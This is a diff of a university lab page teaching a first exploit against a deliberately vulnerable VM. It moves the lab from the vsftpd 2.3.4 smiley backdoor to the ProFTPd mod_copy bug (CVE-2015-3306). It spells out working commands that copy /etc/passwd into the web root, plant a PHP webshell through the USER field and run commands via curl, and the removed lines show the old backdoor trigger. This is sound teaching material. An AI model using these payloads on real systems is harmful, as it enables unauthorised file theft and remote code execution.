@@ -3,9 +3,9 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>lab 00 — Your first exploit (vsftpd backdoor)</title>
+<title>lab 00 — Your first exploit (ProFTPd mod_copy · CVE-2015-3306)</title>
 <link rel="stylesheet" href="../_shared/lab-base.css?v=5">
-<link rel="stylesheet" href="styles.css?v=6">
+<link rel="stylesheet" href="styles.css?v=7">
 <!-- Prism for syntax highlighting -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism.min.css">
 <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js"></script>
@@ -36,7 +36,7 @@
       <li><a href="#cyberrange">2 · Cyber range</a></li>
       <li><a href="#recon">3 · Reconnaissance</a></li>
       <li><a href="#ftp">4 · FTP in 60 seconds</a></li>
-      <li><a href="#smiley">5 · The smiley trigger</a></li>
+      <li><a href="#modcopy">5 · The mod_copy bug</a></li>
       <li><a href="#exploit">6 · Manual exploit</a></li>
       <li><a href="#msf">7 · Metasploit</a></li>
       <li><a href="#reflection">8 · Reflection</a></li>
@@ -45,7 +45,7 @@
     </ul>
   </nav>
   <div class="toc-foot">
-    <span style="color:var(--ink-mute)">Lab 00 · orientation · vsftpd 2.3.4 backdoor · CVE-2011-2523</span>
+    <span style="color:var(--ink-mute)">Lab 00 · orientation · ProFTPd mod_copy · CVE-2015-3306</span>
   </div>
 </aside>
 
@@ -54,8 +54,8 @@
 <header class="hero" id="intro">
   <div class="eyebrow">DS 6042 · Lab 00 · 2026</div>
   <h1>Your first exploit</h1>
-  <p class="subtitle">Form a team. Connect to the cyber range. Pop a root shell with a smiley face.</p>
-  <p class="byline">Lab 00 is orientation. By the end of class you will have stood up a root shell on a remote machine — twice — without writing any code, using a famous one-byte trigger in vsftpd 2.3.4.</p>
+  <p class="subtitle">Form a team. Connect to the cyber range. Get your first foothold on a remote machine — without writing any code.</p>
+  <p class="byline">Lab 00 is orientation. By the end of class you will have read a stranger's <code>/etc/passwd</code>, written a file onto a webserver you don't own, and run shell commands on a remote box — using a real-world authentication-bypass bug in ProFTPd 1.3.5.</p>
 </header>
 
 <p class="course-frame keep-in-present">
@@ -63,11 +63,11 @@ The goal of <strong>DS 6042</strong> is to teach the tools, techniques, and ment
 </p>
 
 <p class="lede">
-In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> download server was compromised: the maintainer's release <span class="gloss" data-gloss="tarball">tarball</span> was briefly replaced with a <span class="gloss" data-gloss="backdoor">backdoored</span> copy. Anyone who logged in with a username ending in <code>:)</code> — a literal smiley face — tripped a hidden code path that <span class="gloss" data-gloss="fork-sh">forked <code>/bin/sh</code></span> and bound it to <span class="gloss" data-gloss="tcp-port">TCP port</span> 6200. The poisoned binary was caught within days, but it lives on inside <a href="https://docs.rapid7.com/metasploit/metasploitable-2/">Metasploitable 2</a>, the deliberately vulnerable Linux VM the security community uses for teaching. You will fire it three different ways today.
+In April 2015 a security researcher noticed that <span class="gloss" data-gloss="proftpd">ProFTPd</span>'s optional <span class="gloss" data-gloss="mod-copy">mod_copy</span> module accepted the <code>SITE CPFR</code> and <code>SITE CPTO</code> commands <strong>without checking whether the FTP client had logged in</strong>. Anyone who could open a <span class="gloss" data-gloss="tcp-port">TCP</span> connection to port 21 could read or write any file the ProFTPd daemon could reach. That includes <code>/etc/passwd</code>, the web root, and any place else the daemon's process had filesystem access. The bug got the identifier <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a> and a Metasploit module within days; eleven years later it still lives inside <a href="https://github.com/rapid7/metasploitable3">Metasploitable 3</a>, the deliberately-vulnerable Linux VM the security community uses for teaching. You will fire it three different ways today.
 </p>
 
 <div class="cite">
-  <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a> · post-mortem on the <a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">scarybeasts (vsftpd maintainer) blog</a> · Metasploit module: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb"><code>vsftpd_234_backdoor.rb</code></a> · target: <a href="https://docs.rapid7.com/metasploit/metasploitable-2/">Metasploitable 2</a>.
+  <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a> · original disclosure on <a href="https://www.openwall.com/lists/oss-security/2015/04/22/4">Openwall</a> · Metasploit module: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/proftpd_modcopy_exec.rb"><code>proftpd_modcopy_exec.rb</code></a> · target: <a href="https://github.com/rapid7/metasploitable3">Metasploitable 3 (Ubuntu Linux variant)</a>.
 </div>
 
 <div class="callout insight keep-in-present">
@@ -81,7 +81,7 @@ In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> 
 <!-- the Try-It widget down; it never covers anything.              -->
 <!-- ============================================================ -->
 <p class="glossary-hint">
-  A few words above will be unfamiliar — <strong>TCP port</strong>, <code>/bin/sh</code>, <strong>vsftpd</strong>, <strong>tarball</strong>. You don't have to know them yet. Every term <span class="gloss-demo">underlined like this</span> on this page is hoverable: an explainer opens directly below the line you're reading, pushing the rest of the page down — nothing gets covered.
+  A few words above will be unfamiliar — <strong>ProFTPd</strong>, <strong>mod_copy</strong>, <strong>TCP port</strong>, <strong><code>/etc/passwd</code></strong>, <strong>banner</strong>, <strong>enumeration</strong>. You don't have to know them yet. Every term <span class="gloss-demo">underlined like this</span> on this page is hoverable: an explainer opens directly below the line you're reading, pushing the rest of the page down — nothing gets covered.
 </p>
 
 <div class="glossary-panel" id="glossary-panel" hidden aria-live="polite">
@@ -91,19 +91,19 @@ In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> 
 
 <!-- ============================================================ -->
 <h2 id="demo">Demo · the attack you're about to run</h2>
-<p>The widget below is a simulation of the full exploit chain — every keystroke, every server response, every shell. <strong>By the end of §6 you'll have done all of this for real</strong> against the Metasploitable VM in the cyber range. Use the demo now to see where we're headed; come back to it later if you get stuck.</p>
+<p>The widget below is a simulation of the full exploit chain — every keystroke, every server response, every byte of file content. <strong>By the end of §6 you'll have done all of this for real</strong> against the Metasploitable 3 VM in the cyber range. Use the demo now to see where we're headed; come back to it later if you get stuck.</p>
 
 <!-- ============================================================ -->
 <!-- TRY IT — two-terminal exploit simulator                        -->
 <!-- ============================================================ -->
 <div class="viz" id="viz-try-it">
-  <div class="viz-title">Try it · two terminals, one shell</div>
+  <div class="viz-title">Try it · two terminals, one file disclosure</div>
   <div class="viz-description">
-    Two attacker terminals, one target at <code>10.0.0.6</code>. Use <strong>Terminal&nbsp;A</strong> to trigger the backdoor on port 21 — start with <code>nc 10.0.0.6 21</code>, then send <code>USER hacker:)</code> and any <code>PASS</code>. Then use <strong>Terminal&nbsp;B</strong> to connect to the hidden shell on port 6200 — <code>nc 10.0.0.6 6200</code> — and run <code>id</code>. Or click <strong>▶ Auto-play</strong> to watch the entire attack run itself.
+    Two attacker terminals, one target at <code>10.0.0.6</code>. Use <strong>Terminal&nbsp;A</strong> to open the FTP control channel — <code>nc 10.0.0.6 21</code> — then send <code>SITE CPFR /etc/passwd</code> and <code>SITE CPTO /var/www/html/leak</code>. <em>No <code>USER</code> or <code>PASS</code> needed.</em> Then use <strong>Terminal&nbsp;B</strong> to fetch the copied file over HTTP: <code>curl http://10.0.0.6/leak</code>. Or click <strong>▶ Auto-play</strong> to watch the entire attack run itself.
   </div>
   <div class="term-pair">
     <div class="term" data-term="A">
-      <div class="term-label">Terminal A · attacker → ftp (tcp/21)</div>
+      <div class="term-label">Terminal A · attacker → proftpd (tcp/21)</div>
       <div class="term-screen" id="term-a-screen" aria-live="polite"></div>
       <form class="term-input-row" data-term="A">
         <span class="term-prompt" id="term-a-prompt">kali@kali:~$&nbsp;</span>
@@ -111,7 +111,7 @@ In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> 
       </form>
     </div>
     <div class="term" data-term="B">
-      <div class="term-label">Terminal B · attacker → backdoor (tcp/6200)</div>
+      <div class="term-label">Terminal B · attacker → apache (tcp/80)</div>
       <div class="term-screen" id="term-b-screen" aria-live="polite"></div>
       <form class="term-input-row" data-term="B">
         <span class="term-prompt" id="term-b-prompt">kali@kali:~$&nbsp;</span>
@@ -124,15 +124,16 @@ In July 2011 the official <span class="gloss" data-gloss="vsftpd">vsftpd</span> 
     <button class="btn" id="term-reset" type="button">↺ Reset both</button>
     <span class="term-hint" id="term-hint">Hint · type <code>nc 10.0.0.6 21</code> in Terminal A.</span>
   </div>
-  <p class="viz-caption">Both terminals are simulated; nothing leaves your browser. The real exploit runs the same keystrokes against a real Metasploitable VM inside the cyber range (Section 6 below).</p>
+  <p class="viz-caption">Both terminals are simulated; nothing leaves your browser. The real exploit runs the same keystrokes against a real Metasploitable 3 VM inside the cyber range (Section 6 below).</p>
 </div>
 
 <!-- ============================================================ -->
 <h2 id="where">An Overview of Tools and Targets</h2>
 <ul>
-  <li>Target: <strong>Metasploitable 2</strong> on a private subnet, no internet egress. The vulnerable service is <code>vsftpd 2.3.4</code> on TCP/21.</li>
-  <li>Tools (pre-installed on the Kali VM): <code>nmap</code>, <code>nc</code> (netcat), <code>msfconsole</code> (Metasploit Framework).</li>
-  <li>Original CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">CVE-2011-2523</a>. Metasploit module: <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.</li>
+  <li>Target: <strong>Metasploitable 3 · Ubuntu Linux variant</strong> on a private subnet, no internet egress. The vulnerable service is <code>ProFTPd 1.3.5</code> on TCP/21 with the <code>mod_copy</code> module loaded.</li>
+  <li>Tools (pre-installed on the Kali VM): <code>nmap</code>, <code>nc</code> (netcat), <code>curl</code>, <code>msfconsole</code> (Metasploit Framework).</li>
+  <li>CVE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a>. Metasploit module: <code>exploit/unix/ftp/proftpd_modcopy_exec</code>.</li>
+  <li>Punchline of the lab: <strong>command execution as <code>www-data</code></strong> on the target — pre-authentication, no credentials needed. You will read <code>/etc/passwd</code> (world-readable) and run arbitrary shell commands. Going further (root) is a privilege-escalation step covered in Lab 10.</li>
 </ul>
 
 <!-- ============================================================ -->
@@ -287,11 +288,11 @@ Nmap scan report for 10.0.0.6
 Host is up (0.00033s latency).
 
 PORT   STATE SERVICE VERSION
-21/tcp open  ftp     <span class="term-hl">vsftpd 2.3.4</span>
+21/tcp open  ftp     <span class="term-hl">ProFTPD 1.3.5</span>
 
 Service detection performed. Please report any incorrect results.
 Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds</pre>
-  <p class="viz-caption">The version string <code>vsftpd 2.3.4</code> is the smoking gun. That specific release has a famous, easy-to-trigger backdoor — which is why we picked it for the first lab.</p>
+  <p class="viz-caption">The version string <code>ProFTPD 1.3.5</code> is the smoking gun. That release shipped with the <code>mod_copy</code> module enabled and an authentication-bypass bug — which is why we picked it for the first lab.</p>
 </div>
 
 <h3>3.3 Confirm the banner with your own eyes</h3>
@@ -299,11 +300,11 @@ Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds</pre>
 <p>You don't have to trust Nmap. Connect to the FTP service with <code>nc</code> (netcat, the swiss-army-knife TCP client):</p>
 
 <pre><code class="language-bash">nc $TARGET 21
-# 220 (vsFTPd 2.3.4)        ← server greeting
+# 220 ProFTPD 1.3.5 Server (Debian) [::ffff:10.0.0.6]   ← server greeting
 QUIT
 # 221 Goodbye.</code></pre>
 
-<p><code>220</code> is the FTP "service ready" reply code. The parenthesized string is exactly what <code>nmap -sV</code> was reading.</p>
+<p><code>220</code> is the FTP "service ready" reply code. The string after it is exactly what <code>nmap -sV</code> was reading. Notice the version is in the banner <em>by default</em> — ProFTPd does not hide it. The first hardening move at any real deployment is to set <code>ServerIdent</code> to something less informative; here in the lab the banner is what hands us the CVE.</p>
 
 <!-- ============================================================ -->
 <h2 id="ftp">4 · FTP in 60 seconds</h2>
@@ -316,16 +317,16 @@ QUIT
   <table class="proto">
     <thead><tr><th>direction</th><th>line</th><th>meaning</th></tr></thead>
     <tbody>
-      <tr><td class="proto-dir from-srv">← server</td><td><code>220 (vsFTPd 2.3.4)</code></td><td>service ready, banner</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>220 ProFTPD 1.3.5 Server (Debian)</code></td><td>service ready, banner</td></tr>
       <tr><td class="proto-dir from-cli">→ client</td><td><code>USER alice</code></td><td>"I want to log in as alice"</td></tr>
-      <tr><td class="proto-dir from-srv">← server</td><td><code>331 Please specify the password.</code></td><td>username known, need password</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>331 Password required for alice</code></td><td>username known, need password</td></tr>
       <tr><td class="proto-dir from-cli">→ client</td><td><code>PASS hunter2</code></td><td>password</td></tr>
-      <tr><td class="proto-dir from-srv">← server</td><td><code>230 Login successful.</code></td><td>authenticated</td></tr>
+      <tr><td class="proto-dir from-srv">← server</td><td><code>230 User alice logged in</code></td><td>authenticated</td></tr>
       <tr><td class="proto-dir from-cli">→ client</td><td><code>QUIT</code></td><td>close session</td></tr>
       <tr><td class="proto-dir from-srv">← server</td><td><code>221 Goodbye.</code></td><td>session closed</td></tr>
     </tbody>
   </table>
-  <p class="viz-caption">The entire attack is two of these lines: a crafted <code>USER</code> and any <code>PASS</code>. No real authentication happens — read on.</p>
+  <p class="viz-caption">The attack happens <em>before</em> authentication. We never get to the <code>230 logged in</code> line — instead we send <code>SITE CPFR</code> / <code>SITE CPTO</code> straight after the banner. The bug is that ProFTPd's <code>mod_copy</code> answers those commands without checking whether we've logged in first.</p>
 </div>
 
 <div class="exercise">
@@ -335,121 +336,143 @@ QUIT
 </div>
 
 <!-- ============================================================ -->
-<h2 id="smiley">5 · The smiley trigger</h2>
+<h2 id="modcopy">5 · The mod_copy bug</h2>
 
-<p>In vsftpd 2.3.4, the attacker who included <strong><code>:)</code> at the end of the <code>USER</code> argument</strong> tripped a hidden branch that forked <code>/bin/sh</code> and bound it to TCP port 6200. The author of the malicious code is unknown — it was injected by whoever compromised the download server. Stripped to its essence, the poisoned source did something like this:</p>
+<p>ProFTPd 1.3.5 ships an optional module called <strong><code>mod_copy</code></strong> that adds two non-standard FTP commands — <code>SITE CPFR</code> (copy-from) and <code>SITE CPTO</code> (copy-to) — so a logged-in user can duplicate files on the server without downloading and re-uploading them. Useful feature; uncontroversial. The bug is in <em>where the authentication check sits</em>.</p>
 
-<pre><code class="language-c">/* str.c, hostile addition — vsftpd-2.3.4 backdoored tarball */
-if (p_str-&gt;p_buf[i] == 0x3a    /* ':' */
- &amp;&amp; p_str-&gt;p_buf[i+1] == 0x29) /* ')' */
-{
-    vsf_sysutil_extra();        /* fork /bin/sh, bind :6200 */
+<p>The intended flow is: client logs in with <code>USER</code>/<code>PASS</code>, then issues <code>SITE CPFR /path/from</code> followed by <code>SITE CPTO /path/to</code>. The <code>mod_copy</code> handler reads the source path, opens the destination path, writes one to the other. Both files are accessed with the running <em>daemon's</em> permissions, not the logged-in user's. Stripped to its essence, the handler does this:</p>
+
+<pre><code class="language-c">/* mod_copy.c — what the SITE CPFR / CPTO handler does, simplified */
+MODRET copy_cpfr(cmd_rec *cmd) {
+    /* ← no session_authenticated check here  */
+    copy_source = pstrdup(cmd-&gt;pool, cmd-&gt;argv[2]);   /* remember source */
+    return PR_HANDLED(cmd);
+}
+
+MODRET copy_cpto(cmd_rec *cmd) {
+    /* ← no session_authenticated check here either  */
+    return copy_paths(cmd-&gt;tmp_pool, copy_source, cmd-&gt;argv[2]);
 }</code></pre>
 
-<p>The check happens <strong>before authentication</strong>, so the <code>PASS</code> you send doesn't matter — but you still have to send one to keep the protocol state machine happy.</p>
+<p>Notice what's <em>not</em> in the handler: a call to <code>session.auth_required</code>. The handler runs whether or not the client has logged in. Once you reach <code>copy_paths</code> the daemon's file-IO routines do their job — they don't ask who's calling. <strong>Anyone who can open a TCP connection to port 21 can copy any file the ProFTPd process can read to any file the ProFTPd process can write.</strong> No <code>USER</code>, no <code>PASS</code>, no nothing.</p>
 
-<div class="viz" id="viz-smiley">
-  <div class="viz-title">click a username · watch the server's branch</div>
-  <div class="viz-description">Pick a username. The flowchart on the right shows which path the backdoored vsftpd takes when it processes the <code>USER</code> command. Only the highlighted path runs.</div>
-  <div class="smiley-grid">
-    <div class="smiley-picker">
-      <div class="smiley-picker-label">USER &lt;name&gt;</div>
-      <button class="btn smiley-btn" data-user="alice">alice</button>
-      <button class="btn smiley-btn" data-user="root">root</button>
-      <button class="btn smiley-btn" data-user="hacker">hacker</button>
-      <button class="btn smiley-btn primary" data-user="hacker:)">hacker:)</button>
-      <button class="btn smiley-btn" data-user=":)">:)</button>
-      <button class="btn smiley-btn" data-user="alice:)bob">alice:)bob</button>
-      <div class="smiley-readout" id="smiley-readout">Pick a username on the left.</div>
-    </div>
-    <svg id="smiley-svg" class="smiley-svg" viewBox="0 0 360 360" preserveAspectRatio="xMidYMid meet" aria-label="vsftpd 2.3.4 USER command flowchart"></svg>
-  </div>
-  <p class="viz-caption">The substring check happens <em>anywhere in the username</em>, not just at the end — <code>alice:)bob</code> trips it too. The check happens before vsftpd ever looks at the password file.</p>
+<p>That's a one-line bug with two giant consequences:</p>
+
+<div class="callout insight">
+  <span class="label">two attack primitives the bug hands you</span>
+  <ol>
+    <li><strong>Arbitrary file read.</strong> Copy any readable file to a place an HTTP client can fetch (e.g. the web root <code>/var/www/html/</code>). Now you can <code>curl</code> the file off the server.<br>
+    <em>Example:</em> <code>SITE CPFR /etc/passwd</code> &rarr; <code>SITE CPTO /var/www/html/leak</code> &rarr; <code>curl http://target/leak</code>.</li>
+    <li><strong>Arbitrary file write &rarr; code execution.</strong> Copy a file containing PHP code onto the web root. When you fetch that file over HTTP, Apache parses the PHP and runs it. Game over.<br>
+    <em>Example (the Metasploit module does this):</em> stuff a PHP one-liner into the FTP session log (just by sending a clever <code>USER</code>), then <code>SITE CPFR /var/log/proftpd/proftpd.log</code> &rarr; <code>SITE CPTO /var/www/html/x.php</code>. Fetching <code>x.php?cmd=id</code> runs <code>id</code> as the web server.</li>
+  </ol>
+</div>
+
+<p>The shell you get this way runs as <code>www-data</code> (Apache's user), not <code>root</code>. From <code>www-data</code> you can read <code>/etc/passwd</code> (world-readable anyway), explore the filesystem, run any commands the web user has permission for — but you cannot read <code>/etc/shadow</code> or open privileged ports. Getting from <code>www-data</code> to <code>root</code> is a separate step called <strong>privilege escalation</strong>, and is the focus of <a href="../lab-10/pentest.html">Lab 10</a>. For today, "command execution on the box" is the prize.</p>
+
+<div class="callout note">
+  <span class="label">historical context · why this lab used to be a backdoor</span>
+  <p>Before Metasploitable 3 shipped, Lab 0 attacked <strong>vsftpd 2.3.4</strong> on Metasploitable 2 — a famous <em>backdoor</em>, not a bug. In July 2011 the official vsftpd download server was briefly compromised and the maintainer's release tarball was replaced with a tampered copy. Anyone who logged in with a username containing <code>:)</code> tripped a hidden code path that opened a root shell on TCP port 6200. The poisoned binary was caught within days, but it stayed in Metasploitable 2 forever as a teaching artifact. The contrast is worth holding in your head: <strong>vsftpd 2.3.4 was malicious code injected via the distribution channel</strong> (a supply-chain compromise); <strong>ProFTPd CVE-2015-3306 is honest code with a missing auth check</strong> (a coding bug). Both end with attacker code running on the target. Both are the same outcome from the defender's seat. <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">CVE-2024-3094</a> (the XZ backdoor of 2024) is a modern echo of the first story; CVE-2015-3306 is the second.</p>
 </div>
 
 <div class="exercise">
-  <div class="ex-label">Try it · read the code, trace each username</div>
-  <p>Here's a Python equivalent of the vsftpd 2.3.4 backdoor check — the C snippet in §5 above with the surrounding loop made explicit:</p>
-  <pre><code class="language-python">def trips_backdoor(username: str) -> bool:
-    """Return True if the username would trip the vsftpd 2.3.4 backdoor."""
-    for i in range(len(username) - 1):
-        if username[i] == ':' and username[i + 1] == ')':
-            return True
-    return False</code></pre>
-  <p>For each username below, <strong>trace the loop in your head</strong>: what does <code>trips_backdoor</code> return? If <code>True</code>, at what value of <code>i</code>? Don't peek at the answer until you've decided on all six.</p>
-  <ol>
-    <li><code>hacker</code></li>
-    <li><code>hacker:)</code></li>
-    <li><code>alice:)bob</code></li>
-    <li><code>:)</code></li>
-    <li><code>bob:</code></li>
-    <li><code>:)alice:)</code></li>
-  </ol>
+  <div class="ex-label">Try it · trace the auth check that isn't there</div>
+  <p>Here's a Python sketch of what a correctly-implemented <code>SITE CPFR</code> handler should look like, side-by-side with what ProFTPd 1.3.5 actually shipped:</p>
+  <pre><code class="language-python">def cpfr_correct(session, path: str):
+    """What it should do."""
+    if not session.authenticated:
+        return reply(530, "Please login with USER and PASS.")
+    session.copy_source = path
+    return reply(350, f"File or directory exists, ready for destination name")
+
+def cpfr_proftpd_135(session, path: str):
+    """What ProFTPd 1.3.5 actually did — CVE-2015-3306."""
+    session.copy_source = path                           # ← no auth check
+    return reply(350, f"File or directory exists, ready for destination name")</code></pre>
+  <p><strong>(a)</strong> Suppose an attacker opens a TCP connection to <code>proftpd_135</code> and immediately, with no <code>USER</code> or <code>PASS</code>, sends <code>SITE CPFR /etc/shadow</code>. What does the server reply, and what is <code>session.copy_source</code> set to?</p>
+  <p><strong>(b)</strong> The same attacker now sends <code>SITE CPTO /var/www/html/x</code>. Roughly what happens? What does the attacker then do from their browser to retrieve <code>/etc/shadow</code>?</p>
+  <p><strong>(c)</strong> In the correct version, what reply would the attacker get to the very first command? Why is that one extra line of code (the <code>if not session.authenticated</code> guard) the entire difference between a hardened server and a CVE?</p>
   <details><summary>Show answer</summary><div>
-    <p>The loop tests, at every position <code>i</code>, whether <code>username[i] == ':'</code> AND <code>username[i+1] == ')'</code>. As soon as both are true, the function returns. Tracing each:</p>
-    <ol>
-      <li><code>hacker</code> — no <code>:</code> anywhere; loop completes; <strong>returns False</strong>.</li>
-      <li><code>hacker:)</code> — at <code>i=6</code> we have <code>':'</code> and <code>username[7]</code> is <code>')'</code>; <strong>returns True at i=6</strong>.</li>
-      <li><code>alice:)bob</code> — at <code>i=5</code> we have <code>':'</code> and <code>username[6]</code> is <code>')'</code>; <strong>returns True at i=5</strong>. The function exits before reading <code>bob</code>.</li>
-      <li><code>:)</code> — at <code>i=0</code> we have <code>':'</code> and <code>username[1]</code> is <code>')'</code>; <strong>returns True at i=0</strong>.</li>
-      <li><code>bob:</code> — the trailing <code>':'</code> is at index 3, but the loop bound is <code>range(len-1) = range(3)</code> → <code>i ∈ {0, 1, 2}</code>. We never test index 3. <strong>Returns False</strong> — and notice <em>why</em>: the implementation safely avoids reading past the end of the string by stopping early.</li>
-      <li><code>:)alice:)</code> — at <code>i=0</code> we already have a smiley; <strong>returns True at i=0</strong>. The second smiley at the end is never reached.</li>
-    </ol>
-    <p>The lesson: substring matches are not "starts with" or "ends with" — the trigger fires the first time the byte pair appears, anywhere in the input. The off-by-one in case (5) is worth noticing — the loop bound is the reason a lone trailing colon doesn't crash the server reading past the buffer. Real production code has to handle this kind of edge case deliberately, even (especially) when the code is malicious.</p>
+    <p><strong>(a)</strong> The server replies <code>350 File or directory exists, ready for destination name</code> and stores <code>/etc/shadow</code> as the pending source path. No 530 "please log in" reply ever fires.</p>
+    <p><strong>(b)</strong> The server's <code>cpto</code> handler — also un-guarded in 1.3.5 — calls <code>copy_paths(/etc/shadow, /var/www/html/x)</code>. Because ProFTPd runs as <code>root</code> on most systems (it has to bind port 21), it can read <code>/etc/shadow</code>. Because Apache's web root is writable by the ProFTPd process, the copy succeeds. The attacker then runs <code>curl http://target/x</code> from their browser and reads the password hashes.</p>
+    <p><strong>(c)</strong> The correct version replies <code>530 Please login with USER and PASS.</code> and never touches <code>copy_source</code>. The whole CVE is the missing line. This is the single most common shape of authentication bugs in the wild: an early-return guard that was forgotten on a side-door command. <a href="https://owasp.org/www-project-top-ten/">OWASP A07:2021 (Identification and Authentication Failures)</a> is exactly this class.</p>
   </div></details>
 </div>
 
 <!-- ============================================================ -->
 <h2 id="exploit">6 · Manual exploitation <span class="time-tag">~30 min</span></h2>
 
-<p>Now you do it for real. Open <strong>two terminal tabs</strong> on Kali — the same way the <a href="#viz-try-it">Try-it widget</a> has two — and follow along.</p>
+<p>Now you do it for real. Open <strong>two terminal tabs</strong> on Kali and follow along. The first terminal does the bug-triggering FTP dance; the second one fetches the result over HTTP.</p>
 
 <div class="viz" id="viz-topology">
   <div class="viz-title">what's about to happen on the wire</div>
-  <div class="viz-description">Two TCP connections from Kali to Metasploitable. The first one (port 21) arms the backdoor. The second one (port 6200) attaches to the resulting root shell.</div>
+  <div class="viz-description">Two connections from Kali to the Metasploitable 3 host. The first one (port 21, FTP) issues <code>SITE CPFR /etc/passwd</code> + <code>SITE CPTO /var/www/html/leak</code> — the daemon copies the file into the web root with no auth check. The second one (port 80, HTTP) fetches the copied file with <code>curl</code>.</div>
   <svg id="topo-svg" class="topo-svg" viewBox="0 0 600 220" preserveAspectRatio="xMidYMid meet" aria-label="Kali to Metasploitable network topology"></svg>
 </div>
 
-<h3>6.1 Terminal A · arm the backdoor</h3>
+<h3>6.1 Terminal A · trigger the bug over FTP</h3>
 
 <pre><code class="language-bash">nc $TARGET 21
-# 220 (vsFTPd 2.3.4)
-USER hacker:)
-# 331 Please specify the password.
-PASS whatever
-# &lt;no response — server has forked the shell&gt;</code></pre>
+# 220 ProFTPD 1.3.5 Server (Debian) [::ffff:10.0.0.6]
+SITE CPFR /etc/passwd
+# 350 File or directory exists, ready for destination name
+SITE CPTO /var/www/html/leak
+# 250 Copy successful</code></pre>
 
-<p>The server <em>appears</em> to hang — it never returns a <code>230 Login successful</code> because the backdoor short-circuited the login handler. <strong>Leave this terminal open.</strong> Do not press <kbd>Ctrl</kbd>+<kbd>C</kbd>; that closes the FTP connection and tears the backdoor shell down with it.</p>
+<p>Read those three exchanges carefully. <strong>You never sent <code>USER</code> or <code>PASS</code></strong> — yet the server happily accepted <code>SITE CPFR</code>, remembered <code>/etc/passwd</code> as the pending source, and then on <code>SITE CPTO</code> copied it into Apache's web root with the daemon's privileges. The <code>250 Copy successful</code> reply is the server telling you the file is now sitting at <code>/var/www/html/leak</code>. The <code>QUIT</code> can wait; leave the session open in case you want to copy another file in a moment.</p>
 
-<h3>6.2 Terminal B · attach to the shell</h3>
+<h3>6.2 Terminal B · fetch the file over HTTP</h3>
 
-<pre><code class="language-bash">nc $TARGET 6200
-id
-# uid=0(root) gid=0(root)
-whoami
-# root</code></pre>
+<pre><code class="language-bash">curl http://$TARGET/leak
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+# ... (every user account on the target) ...
+# vagrant:x:1000:1000::/home/vagrant:/bin/bash</code></pre>
 
-<p>The remote shell has no prompt and no welcome message. It looks like nothing happened. Type a command and press <kbd>Enter</kbd> — output appears. You are <span class="gloss" data-gloss="root"><strong>root</strong></span> on the target.</p>
+<p>You just read every account on the box without authenticating to anything. <code>/etc/passwd</code> is world-readable on Linux, so this particular file isn't a secret — but the <em>mechanism</em> is what matters: <strong>you can copy any file the daemon can read into a place you can fetch.</strong> Change the source path and you change what you read; change the destination path and you change where it goes. The bug is a universal file-read and (in the next subsection) a universal file-write.</p>
 
-<h3>6.3 Confirm what root buys you</h3>
+<h3>6.3 Turn the bug into code execution</h3>
 
-<pre><code class="language-bash">hostname             # metasploitable
-uname -a             # Linux metasploitable 2.6.24-16-server ...
-cat /etc/shadow      # password hashes, normally root-only
-ls /root             # root's home directory
-exit                 # close the shell</code></pre>
+<p>File read is a nice party trick; <em>arbitrary code execution</em> is the prize. The standard trick on this CVE is to plant a PHP one-liner where Apache will execute it. The most common channel is the ProFTPd auth log: anything you send as the <code>USER</code> argument gets written to <code>/var/log/proftpd/proftpd.log</code>. Send PHP code as the username, copy the log into the web root with a <code>.php</code> extension, then fetch it.</p>
 
-<p><code>/etc/shadow</code> is normally readable only by root because it contains password hashes. You can read it. That is the entire promise of the exploit: arbitrary code execution as the highest-privilege user on the machine, <em>before authentication</em>, in two lines.</p>
+<pre><code class="language-bash"># --- Terminal A · plant the PHP, then copy the log into web root ---
+nc $TARGET 21
+# 220 ProFTPD 1.3.5 Server (Debian) ...
+USER &lt;?php system($_GET[&quot;c&quot;]); ?&gt;
+# 331 Password required for &lt;?php ...
+# (no need to send PASS; the USER value is already in the log)
+SITE CPFR /var/log/proftpd/proftpd.log
+# 350 File or directory exists, ready for destination name
+SITE CPTO /var/www/html/sh.php
+# 250 Copy successful
+
+# --- Terminal B · run commands through the webshell ---
+curl 'http://$TARGET/sh.php?c=id'
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+curl 'http://$TARGET/sh.php?c=hostname;%20uname%20-a'
+# metasploitable3-ub1404
+# Linux metasploitable3-ub1404 4.2.0-27-generic ...
+curl 'http://$TARGET/sh.php?c=cat%20/etc/passwd'
+# (same listing as before, but now via shell, not file read)</code></pre>
+
+<p>You are now <code>www-data</code> on the target — the user Apache runs as. You can execute arbitrary commands through the <code>?c=...</code> URL parameter. You <em>cannot</em> read <code>/etc/shadow</code> (that requires root); you can read anything the web user can read, write anywhere the web user can write, and run any program on the box.</p>
 
 <div class="callout insight">
   <span class="label">deliverable · part 6</span>
-  <p>Screenshot of <code>id</code> returning <code>uid=0(root) gid=0(root)</code> inside the Terminal B shell. One short paragraph in your team notes: <em>in your own words, what did the smiley face do?</em></p>
